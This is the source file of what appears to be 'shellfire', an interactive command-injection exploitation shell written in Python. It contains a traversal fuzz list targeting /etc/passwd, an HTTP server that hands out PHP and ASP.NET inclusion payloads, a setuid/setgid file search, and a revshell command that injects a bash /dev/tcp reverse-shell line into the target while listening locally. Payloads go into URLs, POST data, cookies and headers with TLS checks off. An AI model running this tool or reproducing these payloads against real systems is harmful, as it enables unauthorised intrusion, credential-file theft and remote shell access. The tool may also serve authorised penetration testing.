import copy
import json
import os
import readline
import requests
import select
import socket
import sys
import threading
import time
import urllib.parse
from shellfire.config import cfg, state, Mode
from shellfire.plugin_collection import plugins
from shellfire.payloads import get_aspnet_payload, get_php_payload


############################################################
## Payloads


def payload_aspnet():
  cfg.payload = get_aspnet_payload(cfg.marker)
  cfg.payload_type = "ASP.NET"
  return


def payload_php():
  cfg.payload = get_php_payload(cfg.marker)
  cfg.payload_type = "PHP"
  return


def payload_fuzzfile():
  ## root:.:0:0:.*:.*:.+
  if cfg.fuzzfile == 'default':
    payload = [r"../../../../../../../../../etc/passwd",
      r"../../../../../../../../etc/passwd",
      r"../../../../../../../etc/passwd",
      r"../../../../../../etc/passwd",
      r"../../../../../etc/passwd",
      r"../../../../etc/passwd",
      r"../../../etc/passwd",
      r"../../../../../../../../../../../../etc/passwd%00",
      r"../../../../../../../../../../../../etc/passwd",
      r"/../../../../../../../../../../etc/passwd^^",
      r"/../../../../../../../../../../etc/passwd",
      r"/./././././././././././etc/passwd",
      r"\..\..\..\..\..\..\..\..\..\..c\passwd",
      r"..\..\..\..\..\..\..\..\..\..c\passwd",
      r"/..\../..\../..\../..\../..\../..\../etc/passwd",
      r".\./.\./.\./.\./.\./.\./etc/passwd",
      r"\..\..\..\..\..\..\..\..\..\..c\passwd%00",
      r"..\..\..\..\..\..\..\..\..\..c\passwd%00",
      r"%0a/bin/cat%20/etc/passwd",
      r"%00/etc/passwd%00",
      r"%00../../../../../../etc/passwd",
      r"/../../../../../../../../../../../etc/passwd%00.jpg",
      r"/../../../../../../../../../../../etc/passwd%00.html",
      r"/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
      r"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
      r"\&apos;/bin/cat%20/etc/passwd\&apos;"
    ]
  else:
    payload = []
    with open(cfg.fuzzfile, 'r') as file:
      payloads = file.readlines()
      for p in payloads:
        payload.append(p)
  return payload


############################################################
## Functions

def show_help(cmd=None):
  if cmd and cmd[0:1] == '.':
    cmd = cmd[1:]
  if cmd in command_list:
    if len(command_list[cmd]["help_text"]):
      sys.stdout.write("".join(command_list[cmd]["help_text"]))
    else:
      sys.stdout.write("command doesn't have help text\n")
  else:
    sys.stdout.write("Available commands:\n")
    for cmd_key in command_list:
      sys.stdout.write("  %s\n" % (cmd_key))


def http_server(port):
  ## super simple http. we can probably make this more robust.
  ## set up network listener first
  addr = ''
  conn = None
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock.settimeout(1)
  sock.bind((addr, port))
  sock.listen(1)
  ## server loop
  while http_running is True:
    try:
      if not conn:
        conn, addr = sock.accept()
      conn.recv(1024)

      http_response = "HTTP/1.1 200 OK\n\n" + cfg.payload + "\n"

      ## send payload to the client
      conn.send(bytes(http_response, 'utf-8'))
      conn.close()
      conn = None
    except Exception as e:
      if state.args.debug:
        sys.stderr.write("[!] Err. socket.error : %s\n" % e)
      pass
  sys.stdout.write("[*] HTTP Server stopped\n")


def rev_shell(addr, port):
  ## setup listener for reverse shell
  port = int(port)
  state.revshell_running = True
  conn = None
  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock.bind((addr, port))
  sock.listen(1)
  conn, client_address = sock.accept()

  ## listener loop
  while True:
    socket_list = [conn, sys.stdin]
    read_sockets, write_sockets, error_sockets = select.select(
        socket_list, [], [])

    ## wait for connections
    for s in read_sockets:
      if s == conn:
        data = s.recv(4096)
        if not data:
          state.revshell_running = False
          return
        else:
          sys.stdout.write(data)
          sys.stdout.flush()
      else:
        msg = input()
        conn.send(msg)

  ## cleanup
  conn.close()
  state.revshell_running = False
  return


def parse_to_dict(data):
  if data[0] is "{":
    ## try to parse as json encoded data
    try:
      return json.loads(data)
    except Exception as e:
      sys.stderr.write("[!] %s\n" % e)
  else:
    ## try to parse as url encoded data
    try:
      d = urllib.parse.parse_qs(data.strip())
      ## flatten lists if they are of size 1
      ## this is especially necessary for cookies
      for k,v in d.items():
        if len(v) == 1:
          d[k] = v[0]
      ## return our dict
      return d
    except Exception as e:
      sys.stderr.write("[!] %s\n" % e)
  ## if we failed to pase, return an empty dict
  return {}


def cmd_auth(cmd):
  ## configure HTTP Basic auth settings
  if len(cmd) > 1:
    cfg.auth_user, cfg.auth_pass = cmd[2][len(cmd[0]) + 1:].split(":", 1)
    cfg.auth = requests.auth.HTTPBasicAuth(cfg.auth_user, cfg.auth_pass)
  else:
    sys.stdout.write("[*] HTTP Auth: %s:%s\n" % (cfg.auth_user, cfg.auth_pass))
  return


def cmd_config(cmd):
  ## manage our configs
  if len(cmd) > 3:
    sys.stdout.write("[!] Invalid parameters for .config\n")
    return
  elif len(cmd) > 1:
    if len(cmd) == 3:
      name = cmd[2] + ".cfg"
    else:
      name = 'default.cfg'
    config_path = os.path.expanduser("~") + "/.config/shellfire/"
    name = config_path + name
    if cmd[1] == "save":
      ## make sure our directory exists
      if not os.path.isdir(config_path):
        os.makedirs(config_path)
      ## save our config to json
      with open(name, 'w') as my_config:
        my_config.write(cfg.dump())
        sys.stdout.write("[*] Config saved.\n")
    elif cmd[1] == "load":
      ## load json into our config
      try:
        with open(name, 'r') as my_config:
          cfg.load(json.load(my_config))
          sys.stdout.write("[*] Config restored.\n")
      except Exception:
        sys.stdout.write("[!] Unable to restore config!\n")
  return


def cmd_cookies(cmd):
  ## configure cookies to be sent to target
  ## right now, we only parse JSON
  if len(cmd) < 2:
    sys.stdout.write("[*] Cookies: %s\n" % (json.dumps(cfg.cookies)))
    return
  ## grab our original input, sans our initial command
  data = state.userinput[len(cmd[0]):].strip()
  ## parse our data
  cfg.cookies = parse_to_dict(data)
  if cfg.cookies:
    sys.stdout.write("[*] Cookies set: %s\n" % json.dumps(cfg.cookies))
  return


def cmd_encode(cmd):
  ## if no params passed, display current encoding plugins
  if len(cmd) == 1:
    sys.stdout.write("[*] Encoding: %s\n" % (' | '.join(cfg.encode_chain)))
    return
  ## Set our encoding plugins!
  ## let's remove ".encode" from our cmd
  cmd.pop(0)
  ## reset our chain
  cfg.encode_chain = []
  ## try to load our plugins
  try:
    for c in cmd:
      if c != "|" and c != "''" and c != '""':
        if c in plugins.plugins:
          cfg.encode_chain.append(c)
        else:
          cfg.encode_chain = []
          sys.stdout.write("[!] Invalid plugin '%s'\n" % (c))
          return
  except Exception as e:
    sys.stdout.write("[!] Error: %s\n" % (e))
  return


def cmd_exit(cmd):
  ## exit one level from our current mode
  if state.mode == Mode.config:
    state.http_running = False
    if os.path.isfile(cfg.history_file):
      readline.write_history_file(cfg.history_file)
    sys.exit(0)
  elif state.mode == Mode.shell:
    state.mode = Mode.config


def cmd_files(cmd):
  ## set files to send to remote target
  if len(cmd) == 1:
    sys.stdout.write("[*] Files: %s\n" % (cfg.files))
    return
  if cmd[1] == "":
    cfg.files = {}
    sys.stdout.write("[*] Files cleared.\n")
    return
  if len(cmd) != 3:
    sys.stdout.write("[!] Invalid parameters!\n")
    return
  ## label our vars
  key = cmd[1]
  name = cmd[2]
  ## parse our command
  cfg.files = {'key': key}
  if name[0] == "@":
    cfg.files['file'] = name[1:]
    sys.stdout.write("[*] File set.\n")
  else:
    cfg.files['plugin'] = name
    sys.stdout.write("[*] Plugin set.\n")
  return


def cmd_find(cmd):
  ## run "find" on remote target
  if len(cmd) != 2:
    sys.stdout.write("[!] Invalid parameters\n")
    return
  if cmd[1] == "setgid":
    state.userinput = "find / -type f -perm -02000 -ls"
  elif cmd[1] == "setuid":
    state.userinput = "find / -type f -perm -04000 -ls"
  else:
    sys.stderr.write("[!] Invalid parameters\n")
    return
  state.exec_cmd = True
  return


def cmd_fuzz(cmd):
  ## set files to send to remote target
  if len(cmd) == 1:
    sys.stdout.write("[*] Fuzz file: %s\n" % (cfg.fuzzfile))
    return
  if cmd[1] == "start":
    sys.stderr.write("[*] Starting fuzzer...\n")
    state.exec_cmd = True
    for payload in payload_fuzzfile():
      state.userinput = payload
      sys.stdout.write("[*] payload: %s\n" % (payload))
      send_payload()
    state.exec_cmd = False
  else:
    cfg.fuzzfile = cmd[1]
  return


def cmd_headers(cmd):
  """List or configure the HTTP request headers
    .headers
    .headers default
    .headers {"X-EXAMPLE-HEADER": "SomeValueHere" }
  Args:
    cmd (Str): "default" to reset the headers, otherwise a JSON string of
                the preferred header set.
  """
  if len(cmd) < 1:
    sys.stderr.write("[!] Invalid parameters\n")
    sys.stderr.write("    .headers {\"X-EXAMPLE\": \"some_value_here\"}\n")
    sys.stderr.write("    .headers default\n")
    return
  elif len(cmd) == 1:
    sys.stdout.write("[*] Request headers are: \n")
    sys.stdout.write(json.dumps(cfg.headers, indent=2) + "\n")
    return
  ## let's set our headers!
  if cmd[1] == "default":
    cfg.headers = cfg.default_headers
    sys.stdout.write("[*] Set request headers back to default.\n")
    return
  ## grab our original input, sans our initial command
  data = state.userinput[len(cmd[0]):].strip()
  ## parse our data
  cfg.headers = parse_to_dict(data)
  if cfg.headers:
    sys.stdout.write("[*] Request headers are now: \n")
    sys.stdout.write(json.dumps(cfg.headers, indent=2) + "\n")
  return


def cmd_help(cmd):
  if len(cmd) == 2:
    show_help(cmd[1])
  else:
    show_help()
  return


def cmd_history(cmd):
  ## configure history settings for shellfire (via readline)
  if len(cmd) == 1:
    if os.path.isfile(cfg.history_file):
      sys.stdout.write("[*] History writing is enabled\n")
    else:
      sys.stdout.write("[*] History writing is disabled\n")
  else:
    if cmd[1] == "clear":
      readline.clear_history()
      sys.stdout.write("[*] History is cleared\n")
    elif cmd[1] == "save":
      with open(cfg.history_file, 'a'):
        os.utime(cfg.history_file, None)
      sys.stdout.write("[*] History writing is enabled\n")
    elif cmd[1] == "nosave":
      os.remove(cfg.history_file)
      sys.stdout.write("[*] History writing is disabled\n")
  return


def cmd_http(cmd):
  ## control our local http server
  global http_running
  if len(cmd) == 1:
    if http_running is True:
      sys.stdout.write("[*] HTTP server listening on %s\n" % cfg.http_port)
      sys.stdout.write("[*] HTTP payload: %s\n" % cfg.payload_type)
    else:
      sys.stdout.write("[*] HTTP server is not running\n")
    return
  if cmd[1] == "start":
    if http_running is False:
      if len(cmd) > 2:
        try:
          cfg.http_port = int(cmd[2])
        except Exception:
          sys.stderr.write("[!] Invalid port value: %s\n" % (cmd[2]))
          return
      s = threading.Thread(target=http_server, args=(cfg.http_port,))
      s.start()
      http_running = True
      sys.stdout.write("[*] HTTP server listening on %s\n" % cfg.http_port)
    else:
      sys.stderr.write("[!] HTTP server already running\n")
  elif cmd[1] == "stop":
    if http_running is True:
      http_running = False
      time.sleep(1)
    else:
      sys.stderr.write("[!] HTTP server already stopped\n")
  elif cmd[1] == "payload":
    if cmd[2] == "aspnet":
      payload_aspnet()
    elif cmd[2] == "php":
      payload_php()
    else:
      sys.stderr.write("[!] Unrecognized payload type\n")
      return
    sys.stdout.write("[*] HTTP payload set: %s\n" % cfg.payload_type)
  return


def cmd_marker(cmd):
  print(cmd)
  ## set the marker for our rce payloads
  ## this will determine boundaries to split and clean output
  if len(cmd) == 1:
    sys.stderr.write("[*] Payload marker: %s\n" % (cfg.marker))
    sys.stderr.write("[*] Marker index: %d\n" % (cfg.marker_idx))
    return
  ## let's remove ".marker" from our cmd
  cmd.pop(0)

  ## assign our action and remove it from cmd
  action = cmd[0]
  cmd.pop(0)

  ## process our action
  if action == "set":
    ## set the rest of the string as our marker
    cfg.marker = " ".join(cmd)
    sys.stdout.write("[*] Payload output marker set.\n")
  elif action == "out":
    cfg.marker_idx = [int(idx) for idx in cmd]
    sys.stdout.write("[*] Marker indices set.\n")
  else:
    sys.stdout.write("[!] Bad marker param!\n")
  return


def cmd_method(cmd):
  ## configure HTTP method to use against the target
  if len(cmd) > 2:
    sys.stderr.write("[!] Invalid parameters\n")
    sys.stderr.write("    .method <method>\n")
    return
  if len(cmd) == 2:
    if cmd[1] == "post":
      cfg.method = "post"
    elif cmd[1] == "form":
      cfg.method = "form"
    else:
      cfg.method = "get"
  sys.stdout.write("[*] HTTP method set: %s\n" % cfg.method.upper())
  return


def cmd_phpinfo(cmd):
  ## trigger phpinfo payload
  state.userinput = "_show_phpinfo"
  state.exec_cmd = True
  return


def cmd_plugins(cmd):
  ## show our available plugins
  sys.stdout.write("[*] Available plugins: %s\n" % (' '.join(plugins.plugins)))
  return


def cmd_post(cmd):
  ## configure POST data to send
  if len(cmd) < 2:
    sys.stdout.write("[*] POST data: %s\n" % json.dumps(cfg.post_data))
    return
  ## grab our original input, sans our initial command
  data = state.userinput[len(cmd[0]):].strip()
  ## parse the data
  cfg.post_data = parse_to_dict(data)
  if cfg.post_data:
    sys.stdout.write("[*] POST data set: %s\n" % json.dumps(cfg.post_data))
  return


def cmd_referer(cmd):
  ## set HTTP referer
  if len(cmd) > 1:
    cmd.pop(0)
    cfg.headers['Referer'] = " ".join(cmd)
  sys.stdout.write("[*] Referer set: %s\n" % cfg.headers['Referer'])
  return


def cmd_revshell(cmd):
  ## initiate a reverse shell via rce
  if len(cmd) != 3:
    sys.stderr.write("[!] Invalid parameters\n")
    sys.stderr.write("    .shell <ip_address> <port>\n")
    return
  sys.stdout.write("[*] Initiating reverse shell...\n")
  host = cmd[1]
  port = cmd[2]
  state.userinput = "bash -i >& /dev/tcp/" + host + "/" + port + " 0>&1"

  ## open our reverse shell in a new thread
  s = threading.Thread(target=rev_shell, args=(host, port))
  s.start()

  ## make sure the thread is init before proceeding
  time.sleep(1)

  state.exec_cmd = True
  return


def cmd_shell(cmd):
  if state.mode == Mode.config:
    state.mode = Mode.shell
  return


def cmd_url(cmd):
  ## set URL for remote target
  if len(cmd) > 1:
    cfg.url = state.userinput[len(cmd[0]) + 1:]
  sys.stdout.write("[*] Exploit URL set: %s\n" % cfg.url)
  return


def cmd_useragent(cmd):
  ## set the user agenet to send to target
  if len(cmd) > 1:
    cfg.headers['User-Agent'] = state.userinput[len(cmd[0]) + 1:]
  sys.stdout.write("[*] User-Agent set: %s\n" % cfg.headers['User-Agent'])
  return

def expand_payload(my_list, data):
  ## if we have a dict, expand our marker tags `{}` recursively
  if not isinstance(my_list, dict) and not isinstance(my_list, list):
    return
  if isinstance(my_list, dict):
    ## process as a dict
    for k, v in my_list.items():
        if isinstance(my_list[k], dict) or isinstance(my_list[k], list):
          expand_payload(my_list[k], data)
        else:
          my_list[k] = v.replace('{}', data)
  else:
    ## process as a list
    for k, v in enumerate(my_list):
        if isinstance(v, dict) or isinstance(v, list):
          expand_payload(v, data)
        else:
          my_list[k] = v.replace('{}', data)
  return

def send_payload():
  ## execute our command to the remote target
  if state.exec_cmd:
    cmd = state.userinput

    ## let's run our input through our encoding plugins
    if len(cfg.encode_chain):
      try:
        for enc in cfg.encode_chain:
          cmd = plugins.plugins[enc].run(cmd)
      except Exception:
        pass

    ## generate GET payloads
    if '{}' in cfg.url:
      query = cfg.url.replace('{}', cmd.strip())
    else:
      query = cfg.url

    ## generate POST payloads
    post_data = copy.deepcopy(cfg.post_data)
    expand_payload(post_data, cmd.strip())

    ## generate cookie payloads
    cookie_data = copy.deepcopy(cfg.cookies)
    expand_payload(cookie_data, cmd.strip())
    requests.utils.add_dict_to_cookiejar(state.requests.cookies, cookie_data)

    ## generate headers payloads
    header_data = copy.deepcopy(cfg.headers)
    expand_payload(header_data, cmd.strip())

    ## log debug info
    if state.args.debug:
      sys.stdout.write("[D] URL %s\n" % query)
      if cfg.method == "post":
        sys.stdout.write("[D] POST %s\n" % json.dumps(post_data))
      sys.stdout.write("[D] Cookies %s\n" % json.dumps(cookie_data))
      sys.stdout.write("[D] Headers %s\n" % json.dumps(header_data))
    try:
      if cfg.method == "post":
        r = state.requests.post(
            query,
            data=post_data,
            verify=False,
            # cookies=cookie_data,
            headers=header_data,
            auth=cfg.auth)
      elif cfg.method == "form":
        files = {'': (None, '')}
        ## do we have files to upload?
        if 'key' in cfg.files.keys():
          ## check for raw files first
          if 'file' in cfg.files.keys():
            try:
              files = {cfg.files['key']: open(cfg.files['file'], 'rb')}
            except Exception as e:
              sys.stdout.write("[!] Error opening file for multpart upload: %s\n" % (e))
          ## check for plugins next
          elif 'plugin' in cfg.files.keys():
            try:
              if cfg.files['plugin'] in plugins.plugins:
                files = {cfg.files['key']: plugins.plugins[cfg.files['plugin']].run(cmd)}
              else:
                sys.stdout.write("[!] Invalid plugin '%s'\n" % (cmd[1]))
            except Exception as e:
              sys.stdout.write("[!] Error: %s\n" % (e))
        ## post our form data
        r = state.requests.post(
            query,
            data=post_data,
            files=files,
            verify=False,
            cookies=cookie_data,
            headers=header_data,
            auth=cfg.auth)
      else:
        r = state.requests.get(
            query,
            verify=False,
            cookies=cookie_data,
            headers=header_data,
            auth=cfg.auth)
      ## sanitize the output. we only want to see our commands if possible
      output = ""
      if cfg.marker:
        buffer = r.text.split(cfg.marker)
        if len(buffer) > 1:
          for idx in cfg.marker_idx:
            output = output + buffer[idx] + "\n"
        else:
          output = buffer[0]
        ## strip trailing newlines
        output = output.rstrip()
      else:
        output = r.text
      ## display our results
      sys.stdout.write(output + "\n")
      if state.userinput == '_show_phpinfo':
        file = 'phpinfo.html'
        fp = open(file, 'w')
        fp.write(output)
        fp.close()
        sys.stdout.write("[*] Output saved to '" + file + "'.\n")
    except Exception as e:
      sys.stderr.write("[!] Unable to make request to target.\n")
      sys.stderr.write("[!]   %s\n" % e)
      sys.stdout.flush()
  return


############################################################
## Command list
"""Data structure of all available shellfire commands.
"""
command_list = {
  "auth": {
    "func": cmd_auth,
    "description": "",
    "help_text": [
      "auth                       - show current HTTP Auth credentials.\n",
      "auth <username>:<password> - set the HTTP Auth credentials.\n",
    ],
  },
  "config": {
    "func": cmd_config,
    "description": "",
    "help_text": [
      "config save [name] - save a named config.\n",
      "config load [name] - load a named config.\n",
    ],
  },
  "cookies": {
    "func": cmd_cookies,
    "description": "",
    "help_text": [
      "cookies          - show current cookies to be sent with each request.\n",
      "cookies <string> - a string representing cookies you wish to send.\n",
      "                   strings can be json or url encoded.\n",
      "                   use '{}' to specify where command injection goes.\n",
    ],
  },
  "encode": {
    "func": cmd_encode,
    "description": "",
    "help_text": [
      "encode          - show current encoding used before sending commands.\n",
      "encode <string> - encode commands with plugin <string> before sending.\n",
      "      * you may pass multiple plugins separated with spaces or pipes.\n",
    ],
  },
  "exit": {
    "func": cmd_exit,
    "description": "",
    "help_text": [
      "exit - exits this program.\n"
    ],
  },
  "files": {
    "func": cmd_files,
    "description": "",
    "help_text": [
      "files                  - show files to be sent to target.\n",
      "files \"\"               - unset files.\n",
      "files <field> @<file>  - send contents of file as <field>.\n",
      "files <field> <plugin> - send return value of plugin as <field>.\n",
      "                         the plugin should return a tuple of values\n",
      "                         for the filename and contents.\n",
    ],
  },
  "find": {
    "func": cmd_find,
    "description": "",
    "help_text": [
      "find setuid - search for setuid files.\n",
      "find setgid - search for setgid files.\n",
    ],
  },
  "fuzz": {
    "func": cmd_fuzz,
    "description": "",
    "help_text": [
      "fuzz         - show source for fuzzing.\n",
      "fuzz start   - start fuzzing.\n",
      "fuzz @<file> - use file as source for fuzzing.\n",
      "               type 'default' to use bult-in source.\n",
    ],
  },
  "headers": {
    "func": cmd_headers,
    "description": "",
    "help_text": [
      "headers default   - sets the headers back to the shellfire defaults.\n",
      "headers <string>  - upserts the headers from your string into the header config.\n",
      "                    strings can be json or url encoded.\n",
      "                    use '{}' to specify where command injection goes.\n",
    ],
  },
  "help": {
    "func": cmd_help,
    "description": "",
    "help_text": [
      "help - prints all help topics.\n"
    ],
  },
  "history": {
    "func": cmd_history,
    "description": "",
    "help_text": [
      "history clear  - erase history.\n",
      "history nosave - do not write history file.\n",
      "history save   - write history file on exit.\n",
    ],
  },
  "http": {
    "func": cmd_http,
    "description": "",
    "help_text": [
      "http                - show status of HTTP server\n",
      "http payload [type] - set the payload to be used for RFI.\n",
      "                      supported payload types:\n",
      "                        aspnet\n",
      "                        php\n",
      "http start [port]   - start HTTP server.\n",
      "http stop           - stop HTTP server.\n",
    ],
  },
  "marker": {
    "func": cmd_marker,
    "description": "",
    "help_text": [
      "marker              - show the current payload output marker.\n",
      "marker set <string> - set the payload output marker to string.\n",
      "marker out <number> - the output indices to display after splitting on\n",
      "                      our marker.\n",
    ],
  },
  "method": {
    "func": cmd_method,
    "description": "",
    "help_text": [
      "method      - show current HTTP method.\n",
      "method get  - set HTTP method to GET.\n",
      "method post - set HTTP method to POST.\n",
      "method form - set HTTP method to POST using multipart form data.\n",
    ],
  },
  "phpinfo": {
    "func": cmd_phpinfo,
    "description": "",
    "help_text": [
      "phpinfo - executes the '_show_phpinfo' command via the PHP payload.\n"
    ],
  },
  "plugins": {
    "func": cmd_plugins,
    "description": "",
    "help_text": [
      "plugins - list all available plugins.\n"
    ],
  },
  "post": {
    "func": cmd_post,
    "description": "",
    "help_text": [
      "post <string> - a string representing post data you wish to send.\n",
      "                strings can be json or url encoded.\n",
      "                use '{}' to specify where command injection goes.\n",
    ]
  },
  "referer": {
    "func": cmd_referer,
    "description": "",
    "help_text": [
      "referer          - show the HTTP referer string.\n",
      "referer <string> - set the value for HTTP referer.\n",
    ],
  },
  "revshell": {
    "func": cmd_revshell,
    "description": "",
    "help_text": [
      "shell <ip_address> <port> - initiate reverse shell to target.\n",
    ]
  },
  "shell": {
    "func": cmd_shell,
    "description": "",
    "help_text": [
      "shell - enter exploitation shell. commands entered here are processed and sent as\n",
      "        payloads to your target.\n"
    ]
  },
  "url": {
    "func": cmd_url,
    "description": "",
    "help_text": [
      "url <string> - set the target URL to string.\n",
      "               use '{}' to specify where command injection goes.\n",
    ],
  },
  "useragent": {
    "func": cmd_useragent,
    "description": "",
    "help_text": [
      "useragent          - show the User-Agent string.\n",
      "useragent <string> - set the value for User-Agent.\n",
    ],
  },
  "quit": {
    "func": cmd_exit,
    "description": "Alias of \".exit\"",
    "help_text": [
      "quit - exits this program.\n"
    ],
  },
}
